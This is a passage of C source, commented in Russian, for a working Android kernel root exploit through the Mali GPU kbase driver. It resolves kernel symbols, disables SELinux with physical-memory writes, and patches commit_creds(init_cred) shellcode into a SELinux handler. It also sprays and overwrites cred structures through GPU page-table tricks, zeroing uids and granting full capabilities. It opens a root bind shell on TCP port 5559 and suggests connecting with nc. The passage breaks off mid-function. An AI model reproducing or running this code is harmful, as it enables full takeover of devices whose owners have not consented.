        if (num_syms < 0x1000 || num_syms > 0x100000) continue;
        if (off < 4 * num_syms + 0x100) continue;
        uint8_t* names = K + off + 16;
        char b1[128], b2[128];
        if (dec_name(names, b1, sizeof b1) < 2) continue;
        if (dec_name(names + 1 + names[0], b2, sizeof b2) < 2) continue;
        // первые имена — "_text"/"_stext"/"..." либо type-префикс + имя
        kallsyms_rel_base = v;
        int32_t* offs = (int32_t*)(K + off - 4 * num_syms);
        printf("[S] rel_base=0x%llx num_syms=%llu (off=0x%zx)\n",
               (unsigned long long)v, (unsigned long long)num_syms, off);

        const char* want[] = { "init_cred", "commit_creds", "selinux_enforcing",
                               "sel_read_handle_unknown" };
        uint64_t* dst[] = { &sym_init_cred, &sym_commit_creds,
                            &sym_selinux_enforcing, &sym_sel_read_handle_unknown };
        uint8_t* np = names;
        int found = 0;
        for (uint64_t s = 0; s < num_syms && found < 4; s++) {
            char nm[192];
            int w = dec_name(np, nm, sizeof nm);
            if (w < 0) break;
            const char* cand = nm;
            if (nm[0] >= 'A' && nm[0] <= 'z' && nm[1]) cand = nm + 1;  // тип-символ
            for (int q = 0; q < 4; q++)
                if (!dst[q][0] && !strcmp(cand, want[q])) {
                    dst[q][0] = kallsyms_rel_base + (int64_t)offs[s];
                    found++;
                }
            np += 1 + np[0];
        }
        printf("[S] init_cred=0x%llx commit_creds=0x%llx selinux_enf=0x%llx srhu=0x%llx\n",
               (unsigned long long)sym_init_cred, (unsigned long long)sym_commit_creds,
               (unsigned long long)sym_selinux_enforcing,
               (unsigned long long)sym_sel_read_handle_unknown);
        return (found == 4) ? 0 : -1;
    }
    printf("[S] relative_base не найден\n");
    return -1;
}

static uint64_t v2p(uint64_t virt) { return virt - kallsyms_rel_base + KBASE_PHYS; }

static uint32_t enc_adrp(int rd, uint64_t pc, uint64_t label) {
    uint64_t pc_page = pc >> 12, label_page = label >> 12;
    int64_t offset = (int64_t)((label_page - pc_page) << 12);
    int64_t immhi = offset >> 14;
    int32_t immlo = (int32_t)((offset >> 12) & 3);
    uint32_t v = (uint32_t)(rd & 0x1f);
    v |= (1u << 28) | (1u << 31);
    v |= (uint32_t)immlo << 29;
    v |= (uint32_t)((immhi << 5) & 0xffffe0);
    return v;
}

static void cpu_cache_thrash(void);
static void try_become_root_shell(void);
#define ROOT_WAIT_LOOPS 300

static void do_root(void) {
    uint64_t srhu_p = v2p(sym_sel_read_handle_unknown);
    uint64_t init_p = v2p(sym_init_cred);
    uint64_t cc_p = v2p(sym_commit_creds);
    uint64_t se_p = v2p(sym_selinux_enforcing);
    printf("[R] phys: srhu=0x%llx init_cred=0x%llx commit_creds=0x%llx selinux_enf=0x%llx\n",
           (unsigned long long)srhu_p, (unsigned long long)init_p,
           (unsigned long long)cc_p, (unsigned long long)se_p);

    // selinux_enforcing = 0
    wphys32(se_p, 0);
    printf("[R] selinux_enforcing=0 записан\n");

    // shellcode на sel_read_handle_unknown:
    //   adrp x0, init_cred; add x0, x0, #lo; adrp x8, commit_creds; add x8, x8, #lo;
    //   stp x29,x30,[sp,#-0x10]; blr x8; ldp x29,x30,[sp],#0x10; ret
    uint64_t pc = sym_sel_read_handle_unknown;
    uint32_t code[8];
    code[0] = enc_adrp(0, pc, sym_init_cred);
    code[1] = 0x91000000u | ((uint32_t)(sym_init_cred & 0xFFF) << 10) | (0u << 5) | 0u;
    code[2] = enc_adrp(8, pc + 8, sym_commit_creds);
    code[3] = 0x91000000u | ((uint32_t)(sym_commit_creds & 0xFFF) << 10) | (8u << 5) | 8u;
    code[4] = 0xa9bf7bfd;
    code[5] = 0xd63f0100;
    code[6] = 0xa8c17bfd;
    code[7] = 0xd65f03c0;
    for (int i = 7; i >= 0; i--) {
        wphys32(srhu_p + i * 4, code[i]);
        printf("[R] shellcode[%d] = %08x записан\n", i, code[i]);
    }
    sleep(1);
    // триггер: чтение /sys/fs/selinux/reject_unknown вызывает sel_read_handle_unknown
    printf("[R] триггер: reject_unknown...\n");
    int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
    if (f >= 0) { char b; read(f, &b, 1); close(f); }
    else printf("[R] триггер: open failed: %s (SELinux fs смонтирован?)\n", strerror(errno));
    // ждём: I-cache ядра должен выкинуть старый код (L2 вымывается thrash'ом)
    for (int q = 0; q < ROOT_WAIT_LOOPS; q++) {
        if (getuid() == 0) try_become_root_shell();
        for (int cpu = 0; cpu < 4; cpu += 2) { migrate_to_cpu(cpu); cpu_cache_thrash(); }
        usleep(200000);
    }
    printf("[R] uid=%d euid=%d%s\n", getuid(), geteuid(),
           getuid() == 0 ? "  === ROOT ===" : "");
}

// ---------- GPU L2 flush + CPU D-cache thrash ----------
static void gpu_cache_flush(int fd) {
    uint8_t* jm;
    uint64_t jc = alloc_bound(fd, 1, 1, &jm);
    if (!jc) { printf("[F] cache flush alloc fail\n"); return; }
    struct MALI_JOB_HEADER jh = {0};
    jh.is_64b = true;
    jh.type = MALI_JOB_TYPE_CACHE_FLUSH;
    MALI_JOB_HEADER_pack((uint32_t*)jm, &jh);
    struct base_jd_atom_v2 atom = {0};
    atom.jc = jc;
    atom.atom_number = atom_number++;
    atom.core_req = BASE_JD_REQ_CS;
    int r = submit_atom(fd, &atom);
    printf("[F] CACHE_FLUSH job: submit=%d\n", r);
    usleep(200000);
    struct pollfd pf = { .fd = fd, .events = POLLIN };
    if (poll(&pf, 1, 500) > 0) { char ev[256]; read(fd, ev, sizeof(ev)); }
}

static void do_mem_sync(int fd, uint64_t handle, uint8_t* uaddr, uint64_t size) {
    struct kbase_ioctl_mem_sync sync = {0};
    sync.handle = handle;
    sync.user_addr = (uint64_t)uaddr;
    sync.size = size;
    sync.type = 1;
    int r = ioctl(fd, KBASE_IOCTL_MEM_SYNC, &sync);
    printf("[F] MEM_SYNC(type=1, sz=%llu): %s\n",
           (unsigned long long)size, r < 0 ? strerror(errno) : "OK");
}

static void cpu_cache_thrash(void) {
    size_t sz = 8u * 1024 * 1024;
    volatile char* buf = (volatile char*)malloc(sz);
    if (!buf) { printf("[F] thrash alloc fail\n"); return; }
    for (int pass = 0; pass < 3; pass++)
        memset((void*)buf, 0x55 + pass, sz);
    volatile char sink = 0;
    for (size_t i = 0; i < sz; i += 64)
        sink += buf[i];
    (void)sink;
    free((void*)buf);
    __sync_synchronize();
}

// ---------- siglongjmp-based safe memory probe (runs in parent!) ----------
static sigjmp_buf probe_jmp;
static volatile sig_atomic_t probe_sig;
static void probe_handler(int sig) { probe_sig = sig; siglongjmp(probe_jmp, 1); }

static int probe_read(volatile uint8_t* addr, const char* label, uint8_t* out) {
    struct sigaction sa = {0}, ob, os;
    sa.sa_handler = probe_handler;
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGBUS, &sa, &ob);
    sigaction(SIGSEGV, &sa, &os);
    probe_sig = 0;
    int ok = 0;
    if (sigsetjmp(probe_jmp, 1) == 0) {
        uint8_t v = *addr;
        if (out) *out = v;
        printf("[C] %s READ: 0x%02x OK\n", label, v);
        ok = 1;
    } else {
        printf("[C] %s READ: sig=%d\n", label, probe_sig);
    }
    fflush(stdout);
    sigaction(SIGBUS, &ob, NULL);
    sigaction(SIGSEGV, &os, NULL);
    return ok;
}

static int probe_write(volatile uint8_t* addr, const char* label) {
    struct sigaction sa = {0}, ob, os;
    sa.sa_handler = probe_handler;
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGBUS, &sa, &ob);
    sigaction(SIGSEGV, &sa, &os);
    probe_sig = 0;
    int ok = 0;
    if (sigsetjmp(probe_jmp, 1) == 0) {
        uint8_t old = *addr;
        *addr = 0x42;
        __sync_synchronize();
        uint8_t rb = *addr;
        *addr = old;
        printf("[C] %s WRITE: 0x42->rb=0x%02x %s\n", label, rb, rb == 0x42 ? "OK" : "FAIL");
        ok = (rb == 0x42);
    } else {
        printf("[C] %s WRITE: sig=%d\n", label, probe_sig);
    }
    fflush(stdout);
    sigaction(SIGBUS, &ob, NULL);
    sigaction(SIGSEGV, &os, NULL);
    return ok;
}

// ---------- CPU write test (all in parent process!) ----------
static int do_cpu_write_test(void) {
    printf("[C] CPU test (parent-process): freed_idx=%d\n", freed_idx);
    printf("[C] src_map=%p  alias_sub=%p\n",
           (void*)src_map[freed_idx], (void*)alias_sub[freed_idx]);

    // Phase 1: right after jit_free (no reserve allocs)
    printf("[C] --- phase 1: after jit_free, NO reserve ---\n");
    int a1 = probe_read(alias_sub[freed_idx], "alias", NULL);
    int s1 = probe_read(src_map[freed_idx], "src_map", NULL);
    if (s1) probe_write(src_map[freed_idx], "src_map");
    if (a1) probe_write(alias_sub[freed_idx], "alias");

    // Phase 2: after reserve allocs (like existing validate flow)
    printf("[C] --- phase 2: after reserve allocs ---\n");
    for (int i = 0; i < NRES; i++) {
        uint8_t* m;
        uint64_t real = alloc_bound(fd2, RESERVED_SIZE, 0, &m);
        if (!real) break;
        res_real[i] = real; res_map[i] = m;
        if (mem_commit_pages(fd2, real, RESERVED_SIZE) < 0) break;
        memset(res_map[i], 0x42, RESERVED_SIZE << 12);
    }
    sleep(1);
    int a2 = probe_read(alias_sub[freed_idx], "alias_post_res", NULL);
    int s2 = probe_read(src_map[freed_idx], "src_post_res", NULL);
    if (a2) probe_write(alias_sub[freed_idx], "alias_post_res");
    if (s2) probe_write(src_map[freed_idx], "src_post_res");

    // Phase 3: dump first 64 bytes of alias page if readable
    if (a2) {
        printf("[C] --- alias content (first 64 bytes) ---\n");
        volatile uint64_t* p = (volatile uint64_t*)alias_sub[freed_idx];
        for (int i = 0; i < 8; i++)
            printf("[C]   [%d] 0x%016llx\n", i, (unsigned long long)p[i]);
    }

    printf("[C] === DONE ===\n");
    return 0;
}

// ---------- heap spray: cred overwrite via dangling alias ----------
#define CRED_SPRAY_FORKS 100
#define CRED_UID_SHELL 2000

static int do_heap_spray(void) {
    printf("[H] === HEAP SPRAY MODE ===\n");

    // quick write test via src_map (PROT_READ|PROT_WRITE)
    volatile uint64_t* tp = (volatile uint64_t*)src_map[freed_idx];
    uint64_t old_v = tp[0];
    tp[0] = 0xAAAABBBBCCCCDDDDULL;
    __sync_synchronize();
    if (tp[0] != 0xAAAABBBBCCCCDDDDULL) {
        printf("[H] src_map write FAILED — нет CPU write primitive\n");
        return 1;
    }
    tp[0] = old_v;
    printf("[H] src_map write OK\n");

    // drain kbase pools so freed pages reach buddy allocator
    printf("[H] drain kbase pools...\n");
    drain_release(fd1);
    drain_release(fd2);
    usleep(300000);

    // fork children — each gets a copy of parent's cred (uid=2000)
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("[H] pipe"); return 1; }

    pid_t children[CRED_SPRAY_FORKS];
    int nchild = 0;
    printf("[H] forking %d children...\n", CRED_SPRAY_FORKS);
    for (int i = 0; i < CRED_SPRAY_FORKS; i++) {
        pid_t p = fork();
        if (p < 0) { printf("[H] fork %d: %s\n", i, strerror(errno)); break; }
        if (p == 0) {
            close(pipefd[1]);
            close(fd1); close(fd2);
            char buf;
            read(pipefd[0], &buf, 1);
            close(pipefd[0]);
            if (getuid() == 0) {
                printf("[H] CHILD %d: uid=0 === ROOT ===\n", getpid());
                execl("/system/bin/sh", "sh", (char*)NULL);
            }
            _exit(getuid() == 0 ? 0 : 1);
        }
        children[nchild++] = p;
    }
    printf("[H] forked %d children OK\n", nchild);
    usleep(500000);

    // scan freed pages for cred pattern: RANDSTRUCT layout (from disassembly)
    // usage@+0x00(u32[0]), euid@+0x08(u32[2]), uid@+0x14(u32[5]), gid@+0x18(u32[6]),
    // fsuid@+0x20(u32[8]), user_ns@+0x88, security_blob@+0x78
    // scan via alias (read-only), write via src_map (read-write)
    // both map the same freed physical pages
    printf("[H] scanning %d pages for cred (uid=%d)...\n", SPRAY_PAGES, CRED_UID_SHELL);
    volatile uint32_t* rpage = (volatile uint32_t*)alias_sub[freed_idx];
    volatile uint32_t* wpage = (volatile uint32_t*)src_map[freed_idx];
    int ncred = 0;

    for (int pg = 0; pg < SPRAY_PAGES; pg++) {
        for (int off = 0; off + 20 <= (0x1000 / 4); off++) {
            int b = pg * (0x1000 / 4) + off;
            uint32_t usage = rpage[b];
            if (usage < 1 || usage > 300) continue;
            if (rpage[b + 2] != CRED_UID_SHELL) continue; // euid@+0x08
            if (rpage[b + 5] != CRED_UID_SHELL) continue; // uid@+0x14
            if (rpage[b + 6] != CRED_UID_SHELL) continue; // gid@+0x18

            printf("[H] CRED pg=%d off=0x%x usage=%u uid=%u euid=%u\n",
                   pg, off * 4, usage, rpage[b + 5], rpage[b + 2]);
            ncred++;

            // overwrite via src_map (CPU write → DRAM)
            wpage[b + 2] = 0;  // euid@+0x08
            wpage[b + 5] = 0;  // uid@+0x14
            wpage[b + 6] = 0;  // gid@+0x18
            wpage[b + 8] = 0;  // fsuid@+0x20
            __sync_synchronize();

            // verify via alias (different mapping)
            printf("[H] -> written uid=%u euid=%u (verify via alias)\n",
                   rpage[b + 5], rpage[b + 2]);
        }
    }
    printf("[H] creds found: %d\n", ncred);

    if (!ncred) {
        printf("[H] spray missed — no creds on freed pages\n");
        close(pipefd[1]);
        for (int i = 0; i < nchild; i++) { kill(children[i], SIGKILL); waitpid(children[i], NULL, 0); }
        return 1;
    }

    // flush CPU caches so kernel sees our writes (WC alias → DRAM, then evict kernel's cached copies)
    printf("[H] CPU cache thrash (all cores)...\n");
    for (int cpu = 0; cpu < 4; cpu++) {
        migrate_to_cpu(cpu);
        cpu_cache_thrash();
    }
    __sync_synchronize();
    usleep(500000);
    for (int cpu = 0; cpu < 4; cpu++) {
        migrate_to_cpu(cpu);
        cpu_cache_thrash();
    }

    // signal children
    printf("[H] signaling %d children...\n", nchild);
    close(pipefd[1]);
    sleep(3);

    int root_n = 0;
    for (int i = 0; i < nchild; i++) {
        int st;
        if (waitpid(children[i], &st, WNOHANG) > 0) {
            if (WIFEXITED(st) && WEXITSTATUS(st) == 0) root_n++;
        } else {
            kill(children[i], SIGKILL);
            waitpid(children[i], &st, 0);
        }
    }
    printf("[H] root children: %d / %d\n", root_n, nchild);
    if (root_n) printf("[H] === ROOT ACHIEVED ===\n");
    return root_n ? 0 : 1;
}

// ---------- batch WRITE_VALUE (n jobs in one ioctl) ----------
static uint8_t* g_bcbuf = NULL;
static uint64_t g_bcgpu = 0;
#define BC_STRIDE 64   // bytes per job slot
#define BC_MAX    64

static void init_bcbuf(void) {
    if (!g_bcgpu) g_bcgpu = alloc_bound(fd2, 1, 1, &g_bcbuf);
}

// Submit n WRITE_VALUE jobs (64-bit unless t32[i]) in one ioctl call
static int batch_wv(int fd, uint64_t* addrs, uint64_t* vals, int* t32, int n) {
    if (n <= 0 || n > BC_MAX) return -1;
    init_bcbuf();
    if (!g_bcgpu) return -1;
    static struct base_jd_atom_v2 ba[BC_MAX];
    for (int i = 0; i < n; i++) {
        uint8_t* jm = g_bcbuf + i * BC_STRIDE;
        struct MALI_JOB_HEADER jh = {0};
        jh.is_64b = true;
        jh.type = MALI_JOB_TYPE_WRITE_VALUE;
        struct MALI_WRITE_VALUE_JOB_PAYLOAD pl = {0};
        pl.type = (t32 && t32[i]) ? MALI_WRITE_VALUE_TYPE_IMMEDIATE_32
                                   : MALI_WRITE_VALUE_TYPE_IMMEDIATE_64;
        pl.immediate_value = vals[i];
        pl.address = addrs[i];
        MALI_JOB_HEADER_pack((uint32_t*)jm, &jh);
        MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)(jm + 8), &pl);
        memset(&ba[i], 0, sizeof ba[i]);
        ba[i].jc = g_bcgpu + i * BC_STRIDE;
        ba[i].atom_number = atom_number++;
        ba[i].core_req = BASE_JD_REQ_CS;
    }
    // flush дескрипторов в DRAM (WC-мапа может держать байты — из-за этого batch не работал)
    {
        struct kbase_ioctl_mem_sync sync = {0};
        sync.handle = g_bcgpu;
        sync.user_addr = (uint64_t)g_bcbuf;
        sync.size = (uint64_t)n * BC_STRIDE;
        sync.type = 1;
        ioctl(fd, KBASE_IOCTL_MEM_SYNC, &sync);
        ioctl(fd2, KBASE_IOCTL_MEM_SYNC, &sync);
    }
    struct kbase_ioctl_job_submit sub = {
        .addr = (uint64_t)ba, .nr_atoms = n, .stride = sizeof ba[0]
    };
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &sub) < 0) {
        printf("[B] batch submit(%d): %s\n", n, strerror(errno)); return -1;
    }
    usleep(30000 + n * 500);
    char ev[4096];
    struct pollfd pf = {.fd = fd, .events = POLLIN};
    for (int i = 0; i < n; i++) {
        if (poll(&pf, 1, 100) <= 0) break;
        read(fd, ev, sizeof ev);
    }
    return 0;
}
// ---------- GPU CRED SCAN + PATCH ----------
// fork() не копирует cred (copy_creds = get_cred, только refcount) — дети должны
// сами звать setresuid/setresgid/setfsuid: каждый вызывает prepare_creds()+commit_creds()
// = свежий struct cred в cred_jar. Скан: cred slab выделяется над ядром
// (kdump 0x2080000+22МБ образа — 2000-паттернов нет), старт после image_end.
#define CRED_GPU_FORKS  150
#define CRED_ALLOCS_PER_CHILD 9
#define CRED_SCAN_START 0x03580000ULL
#define CRED_SCAN_END   0x10000000ULL   // 256МБ — cred-слэб рядом с образом ядра
#define CRED_HITS_MAX   256
#define CRED_HITS_ENOUGH 24
#define CRED_WAIT_LOOPS 600

struct cred_hit { uint64_t phys; uint32_t usage; uint32_t shift; };
static struct cred_hit chits[1024];
static int nchits = 0;
static uint64_t g_rel = 0xffffffe410280000ULL;   // REL_BASE текущего бута (обновляет wscan)
static uint64_t g_scan_end = 0;
static int g_batch_ok = 0;   // 0=неизвестно 1=batch_wv работает -1=фолбэк на поштучную

// ровно ОДИН root-shell на сессию: flock-координация между детьми и родителем
static void try_become_root_shell(void) {
    printf("[R] spawn: euid=%d uid()=%d\n", geteuid(), getuid()); fflush(stdout);
    // TCP-шелл: bind 5559 -> accept -> dup2 -> execve sh (stdin=socket, нет EOF-смерти)
    int s = socket(AF_INET, SOCK_STREAM, 0);
    printf("[R] socket=%d errno=%d\n", s, errno); fflush(stdout);
    if (s >= 0) {
        struct sockaddr_in a; memset(&a, 0, sizeof a);
        a.sin_family = AF_INET;
        a.sin_addr.s_addr = htonl(INADDR_ANY);
        a.sin_port = htons(5559);
        int one = 1;
        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
        if (bind(s, (struct sockaddr*)&a, sizeof a) < 0) {
            printf("[R] bind fail errno=%d\n", errno); fflush(stdout);
        } else if (listen(s, 4) < 0) {
            printf("[R] listen fail errno=%d\n", errno); fflush(stdout);
        } else {
            printf("[R] tcp-шелл слушает 5559 — nc 192.168.1.117 5559\n"); fflush(stdout);
            for (;;) {
                int c = accept(s, NULL, NULL);
                if (c < 0) { printf("[R] accept err\n"); fflush(stdout); continue; }
                printf("[R] accept: клиент!\n"); fflush(stdout);
                dup2(c, 0); dup2(c, 1); dup2(c, 2);
                close(s);
                execl("/system/bin/sh", "sh", NULL);
                printf("[R] execl err=%d\n", errno); fflush(stdout);
                _exit(127);
            }
        }
    }
    // фолбэк: старый путь
    int lf = open("/data/local/tmp/.ymax_sh.lock", O_WRONLY | O_CREAT, 0600);
    printf("[R] open lock=%d errno=%d\n", lf, errno); fflush(stdout);
    if (lf >= 0) {
        printf("[R] flock...\n"); fflush(stdout);
        if (flock(lf, LOCK_EX | LOCK_NB) != 0) { close(lf); printf("[R] lock занят, выход\n"); _exit(0); }
        printf("\n=== ROOT SHELL (pid=%d, uid=%d) ===\n", getpid(), geteuid());
        fflush(stdout);
        execl("/system/bin/sh", "sh", (char*)NULL);   // fd держит flock до смерти sh
        printf("[R] execl вернулся?!\n"); fflush(stdout);
        _exit(127);
    }
    if (getuid() == 0) execl("/system/bin/sh", "sh", (char*)NULL);
    printf("[R] fallback exit\n"); fflush(stdout);
    _exit(127);
}
// КЛАССИЧЕСКИЙ layout (дизас sys_getuid: uid@[cred+0x04], sys_geteuid: euid@[cred+0x14]):
// usage@0, uid..fsgid@4..0x20 (8×u32), securebits@0x24, cap_inh@0x28, cap_perm@0x30,
// cap_eff@0x38, cap_bset@0x40, cap_amb@0x48
static int cred_patch_page(uint64_t page_phys, int cstart, int count) {
    set_window(page_phys | 0x443);
    usleep(50000);
    uint64_t base_va = match_B + win_slot * 0x1000;
    for (int h = 0; h < count; h++) {
        uint64_t cp = chits[cstart + h].phys;
        uint64_t va = base_va + (cp & 0xFFF);
        for (int j = 1; j <= 11; j++) {      // uid..fsgid, securebits, cap_inh = 0
            write_value(fd2, va + (uint64_t)j * 4, 0, 1);
            usleep(10000);
        }
        for (int j = 12; j <= 17; j++) {     // cap_perm, cap_eff, cap_bset = full
            write_value(fd2, va + (uint64_t)j * 4, 0xFFFFFFFF, 1);
            usleep(10000);
        }
        for (int j = 18; j <= 19; j++) {     // cap_amb = 0
            write_value(fd2, va + (uint64_t)j * 4, 0, 1);
            usleep(10000);
        }
    }
    usleep(50000);
    return 0;
}

// ---------- TSCAN: найти task_struct по comm="ymax_root" и патчить cred ----------
static int do_tscan(uint64_t start, uint64_t end) {
    printf("[T] === TASK SCAN %llx..%llx ===\n",(unsigned long long)start,(unsigned long long)end);
    if (!g_nfree) {
        size_t sz = 4u << 20;
        uint8_t* d0 = mmu_dump(fd2, sz);
        if (!d0) return 1;
        parse_tree(d0, sz);
        g_l2_phys = l2_table_phys;
        if (g_l2_phys)
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3)
                            g_free_entries[g_nfree++] = i;
                    break;
                }
        munmap(d0, sz);
    }
    printf("[T] L2=0x%llx free=%d\n",(unsigned long long)g_l2_phys,g_nfree);
    if (!g_l2_phys || g_nfree < 64) return 1;
    int SCMAX = 384;  // гибрид: fast-инжекты (3ms) + хвостовой settle 250ms перед дампом
    set_window(g_l2_phys | 0x443);
    usleep(100000);
    size_t dsz = 4u << 20;
    static uint64_t ma[512];
    int batch = 0;
    for (uint64_t base = start; base < end; base += (uint64_t)SCMAX * 0x1000) {
        int n = SCMAX;
        if (base + (uint64_t)n * 0x1000 > end) n = (int)((end - base) >> 12);
        if (n <= 0) break;
        for (int i = 0; i < n; i++) {
            ma[i] = match_B + win_slot * 0x1000 + g_free_entries[i] * 8;
            wvalue_fast(fd2, ma[i], (base + i * 0x1000) | 0x403, 0);
        }
        usleep(250000);   // tail settle: даём ВСЕЙ пачке доработать до дампа
        uint8_t* d = mmu_dump(fd2, dsz);
        if (d) {
            parse_tree(d, dsz);
            for (int i = 0; i < n; i++) {
                uint64_t phys = base + i * 0x1000;
                for (int b = 0; b < ndblk; b++) {
                    if (dblk[b].level != 3 || dblk[b].table_phys != phys) continue;
                    uint8_t* page = (uint8_t*)dblk[b].entries;
                    // ищем "ymax_root\0" (9 симв + 0) И контрольный "swapper/0" из init_task
                    for (int off = 0; off + 16 <= 4096; off++) {
                        int is_swapper = (memcmp(page + off, "swapper/0", 9) == 0);
                        if (memcmp(page + off, "ymax_root", 9) != 0 && !is_swapper) continue;
                        if (page[off + 9] != 0) continue;
                        if (is_swapper) {
                            printf("[T] CONTROL swapper/0 @phys 0x%llx +0x%x (ожидали 0x32ffd40)\n",
                                   (unsigned long long)phys, off);
                            fflush(stdout);
                            continue;
                        }
                        if (off < 0x10) continue;
                        uint64_t credva = *(uint64_t*)(page + off - 0x10);
                        uint64_t relicva = *(uint64_t*)(page + off - 0x18);
                        printf("[T] TASK @0x%llx comm@+0x%x credVA=0x%llx realVA=0x%llx\n",
                               (unsigned long long)phys, off,
                               (unsigned long long)credva, (unsigned long long)relicva);
                        fflush(stdout);
                        // cred VA -> phys (линейная карта: phys = VA - REL_BASE + 0x2080000)
                        const uint64_t REL = 0xffffffe410280000ULL;
                        if ((credva >> 32) != (REL >> 32)) continue;
                        uint64_t credphys = credva - g_rel + 0x2080000;
                        if (credphys < 0x1000000 || credphys > 0x7f800000) continue;
                        // ДОБАВИТЬ В КОНЕЦ СПИСКА CREDS И ЗАПАТЧИТЬ ВЕСЬ ЗАВОДСКИЙ ПАК
                        if (nchits < CRED_HITS_MAX) {
                            chits[nchits].phys = credphys;
                            chits[nchits].usage = 0;
                            chits[nchits].shift = 0;
                            nchits++;
                        }
                    }
                    break;
                }
            }
            munmap(d, dsz);
        }
        batch++;
        printf("[T] batch %d base=0x%08llx hits=%d\n", batch,
               (unsigned long long)base, nchits);
        fflush(stdout);
    }
    // финальное очисение L2
    set_window(g_l2_phys | 0x443);
    usleep(50000);
    for (int i = 0; i < SCMAX; i++)
        write_value(fd2, match_B + win_slot * 0x1000 + g_free_entries[i] * 8, 2, 0);
    usleep(50000);
    printf("[T] scan done: %d задач найдено\n", nchits);
    if (nchits) {
        // dedupe по страницам и патчим все cred
        printf("[T] патч %d cred через GPU...\n", nchits);
        int c = 0;
        while (c < nchits) {
            uint64_t page = chits[c].phys & ~0xFFFULL;
            int e = c;
            while (e < nchits && (chits[e].phys & ~0xFFFULL) == page) e++;
            cred_patch_page(page, c, e - c);
            c = e;
        }
        printf("[T] cache thrash...\n");
        for (int pass = 0; pass < 3; pass++)
            for (int cpu = 0; cpu < 4; cpu++) { migrate_to_cpu(cpu); cpu_cache_thrash(); }
        printf("[T] ждём root (60с)...\n");
        for (int q = 0; q < CRED_WAIT_LOOPS; q++) {
            if (getuid() == 0) try_become_root_shell();
            usleep(100000);
        }
        printf("[T] uid=%d %s\n", getuid(), getuid() == 0 ? "=== ROOT ===" : "(мимо)");
    }
    return 0;
}


// ---------- WSCAN: живой обход списка task_struct через init_task ----------

// читает одну phys-страницу через инжект: inject -> dump -> copy -> cleanup
static int read_phys_page(uint64_t phys, uint8_t* out, size_t sz4m) {
    int k = g_free_entries[0];
    write_value(fd2, match_B + win_slot*0x1000 + k*8, (phys & ~0xFFFULL) | 0x403, 0);
    usleep(20000);
    uint8_t* dm = mmu_dump(fd2, sz4m);
    if (!dm) return -1;
    parse_tree(dm, sz4m);
    int found = -1;
    for (int b = 0; b < ndblk; b++) {
        if (dblk[b].level==3 && dblk[b].table_phys==((phys & ~0xFFFULL))) {
            memcpy(out, dblk[b].entries, 4096);
            found = 0;
            break;
        }
    }
    munmap(dm, sz4m);   // НЕ утекать 4МБ на каждый вызов
    return found;
}


// ---------- VA→PHYS через kernel PGD (VA_BITS=39, 3 уровня) ----------
// PGD = swapper_pg_dir, лежит в .init.data образа → phys фиксирован (0x3143000),
// проверено на kdump-сигнатуре: L0[26/27]=vmalloc-таблицы, L0[400]= образ ядра.
#define SWAPPER_PGD_PHYS 0x3143000ULL
static uint8_t g_pg[4096];
static int g_pg_ok = 0;

static int va_to_phys(uint64_t va, uint64_t* out, size_t sz4m) {
    if (!g_pg_ok) {
        if (read_phys_page(SWAPPER_PGD_PHYS, g_pg, sz4m) != 0) return -1;
        g_pg_ok = 1;
    }
    uint64_t d;
    int ip = (int)((va >> 30) & 0x1FF);
    memcpy(&d, g_pg + ip * 8, 8);
    if (!(d & 1)) return -2;
    if ((d & 3) == 1) {  // 1GB block
        *out = (d & 0x0000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
        return 0;
    }
    uint64_t t1 = d & 0x0000FFFFFFFFF000ULL;
    static uint64_t c1 = 0; static uint8_t p1t[4096];
    if (t1 != c1) { if (read_phys_page(t1, p1t, sz4m) != 0) return -3; c1 = t1; }
    memcpy(&d, p1t + (int)((va >> 21) & 0x1FF) * 8, 8);
    if (!(d & 1)) return -4;
    if ((d & 3) == 1) {  // 2MB block
        *out = (d & 0x0000FFFFE0000000ULL) | (va & 0x1FFFFFULL);
        return 0;
    }
    uint64_t t2 = d & 0x0000FFFFFFFFF000ULL;
    static uint64_t c2 = 0; static uint8_t p2t[4096];
    if (t2 != c2) { if (read_phys_page(t2, p2t, sz4m) != 0) return -5; c2 = t2; }
    memcpy(&d, p2t + (int)((va >> 12) & 0x1FF) * 8, 8);
    if (!(d & 1)) return -6;
    *out = (d & 0x0000FFFFFFFFF000ULL) | (va & 0xFFFULL);
    return 0;
}

static int do_wscan(void) {
    printf("[W] === WSCAN v4: tasks=0x488 + VA\u2192PHYS \u0447\u0435\u0440\u0435\u0437 swapper PGD ===\n");
    if (!g_nfree) {
        size_t sz = 4u << 20;
        uint8_t* d0 = mmu_dump(fd2, sz);
        if (!d0) return 1;
        parse_tree(d0, sz);
        g_l2_phys = l2_table_phys;
        if (g_l2_phys)
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3)
                            g_free_entries[g_nfree++] = i;
                    break;
                }
        munmap(d0, sz);
    }
    if (!g_l2_phys || g_nfree < 16) { printf("[W] L2 \u043d\u0435\u0442\n"); return 1; }
    set_window(g_l2_phys | 0x443);
    usleep(100000);

    const uint64_t ITASK     = 0x32ff600;
    const uint64_t ITASK_IMG = 0x127f600;
    const uint64_t ICOFF     = 0x1297d08;
    const uint64_t TSOFF     = 0x488;
    const uint64_t CREDOFF   = 0x730;
    const uint64_t COMMOFF   = 0x740;
    size_t dsz = 4u << 20;

    uint8_t p1[4096];
    if (read_phys_page(ITASK, p1, dsz) != 0) { printf("[W] init_task fail\n"); return 1; }
    printf("[W] init_task comm='%.9s'\n", p1 + 0xd40);
    uint64_t icva; memcpy(&icva, p1 + 0xd30, 8);
    if (!(icva >> 32)) { printf("[W] init_cred VA \u043d\u0443\u043b\u044c\n"); return 1; }
    g_rel = icva - ICOFF;
    printf("[W] REL_BASE = 0x%llx\n", (unsigned long long)g_rel);
    uint64_t itask_va = g_rel + ITASK_IMG;

